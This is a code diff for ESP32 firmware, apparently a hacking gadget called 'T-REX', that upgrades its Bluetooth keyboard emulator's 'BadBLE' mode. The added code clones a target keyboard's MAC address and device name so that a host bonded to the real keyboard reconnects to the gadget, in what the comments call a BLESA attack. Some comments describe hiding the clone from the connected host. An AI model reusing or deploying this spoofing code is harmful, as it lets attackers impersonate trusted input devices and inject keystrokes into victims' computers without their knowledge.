@@ -24,6 +24,7 @@ static volatile uint16_t s_connHandle        = BLE_HS_CONN_HANDLE_NONE;
 static volatile bool     s_bleExiting        = false;
 static volatile bool     s_kbdStaleBond      = false;  // Windows has stale LTK — must remove from BT settings
 static volatile int      s_lastDisconReason  = 0;      // last onDisconnect reason code — shown on screen for diagnosis
+static bool              s_cloneMacOk        = false;  // BadBLE clone: did the target MAC spoof actually take?
 
 // ── HID Report Descriptor ─────────────────────────────────────────────────────
 // Keyboard — Report ID 1 (8 bytes: modifier, reserved, 6 keycodes)
@@ -218,6 +219,7 @@ bool BleKeyboard::badusbBegin(const char* cloneMacStr, uint8_t cloneType, const 
 }
 void BleKeyboard::badusbEnd()       { endHid(); }
 bool BleKeyboard::badusbConnected() { return s_bleConnected; }
+bool BleKeyboard::badusbCloneMacOk() { return s_cloneMacOk; }   // false = spoof rejected (RPA/public) → name-only
 
 // ── sendMouseMove() ───────────────────────────────────────────────────────────
 void BleKeyboard::sendMouseMove(int8_t x, int8_t y) {
@@ -526,25 +528,36 @@ void BleKeyboard::beginHid(bool bond, const char* cloneMacStr, uint8_t cloneType
     NimBLEDevice::deinit(true);
     vTaskDelay(pdMS_TO_TICKS(200));
     NimBLEDevice::init("T-REX-KBD");
-    // Stable unique address for btkbd (suffix CB) — different from buddy (BD) so
-    // Windows stores two separate bonds and never confuses keyboard with NUS client.
-    // Must be called after init() — ble_hs_id_set_rnd needs the host running.
-    if (cloneMacStr && *cloneMacStr) {
-        // Phase-2 BLESA MAC-clone: become the target's identity address so a host bonded
-        // to it auto-reconnects to us. Public spoofing is often refused by the controller;
-        // random-static (the common BLE-keyboard case) works.
-        uint8_t at = (cloneType == 0) ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
-        NimBLEDevice::setOwnAddr(NimBLEAddress(cloneMacStr, at));
-        NimBLEDevice::setOwnAddrType(at == BLE_ADDR_PUBLIC ? BLE_OWN_ADDR_PUBLIC
-                                                           : BLE_OWN_ADDR_RANDOM);
-    } else {
+
+    // GAP device name (char 0x2A00) — what a CONNECTED host reads. Must be the spoofed/
+    // custom name too, else it reverts to T-REX-KBD on connect and exposes the clone.
+    NimBLEDevice::setDeviceName((cloneName && *cloneName) ? cloneName : "T-REX-KBD");
+
+    // ── Own address ───────────────────────────────────────────────────────────
+    // Must be set after init() — ble_hs_id_set_rnd needs the host running. That call
+    // ONLY accepts a static-random address (MSB top bits 11) or non-resolvable-private;
+    // it REJECTS public + resolvable-private (RPA) addrs (returns false) — so a MAC clone
+    // only works when the target uses a static-random address (the common kbd case).
+    s_cloneMacOk = false;
+    if (cloneMacStr && *cloneMacStr && cloneType != 0) {          // public can't be spoofed
+        if (NimBLEDevice::setOwnAddr(NimBLEAddress(cloneMacStr, BLE_ADDR_RANDOM))) {
+            NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+            s_cloneMacOk = true;                                  // spoof took — host can auto-reconnect
+        }
+    }
+    if (!s_cloneMacOk) {
+        // Fresh/default OR failed-clone fallback. btkbd keeps its stable CB identity (so its
+        // bond persists); BadBLE fresh uses BA and a failed clone uses CC — DISTINCT static-
+        // random addrs so a no-bond session never lands on btkbd's address and corrupts its
+        // bond on the host (was the bk connect/disconnect loop after a clone).
         uint8_t hwmac[6];
         esp_read_mac(hwmac, ESP_MAC_BT);
+        uint8_t suffix = bond ? 0xCB : ((cloneMacStr && *cloneMacStr) ? 0xCC : 0xBA);
         char macStr[18];
-        snprintf(macStr, sizeof(macStr), "C2:%02X:%02X:%02X:%02X:CB",
-                 hwmac[1], hwmac[2], hwmac[3], hwmac[4]);
-        NimBLEDevice::setOwnAddr(NimBLEAddress(macStr, BLE_ADDR_RANDOM));  // register first
-        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);                // succeeds now address exists
+        snprintf(macStr, sizeof(macStr), "C2:%02X:%02X:%02X:%02X:%02X",
+                 hwmac[1], hwmac[2], hwmac[3], hwmac[4], suffix);
+        NimBLEDevice::setOwnAddr(NimBLEAddress(macStr, BLE_ADDR_RANDOM));
+        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
     }
     // Just Works — no PIN dialog, link is encrypted after pairing. bond=true stores a
     // long-term key (btkbd: a persistent keyboard). bond=false = transient encryption,
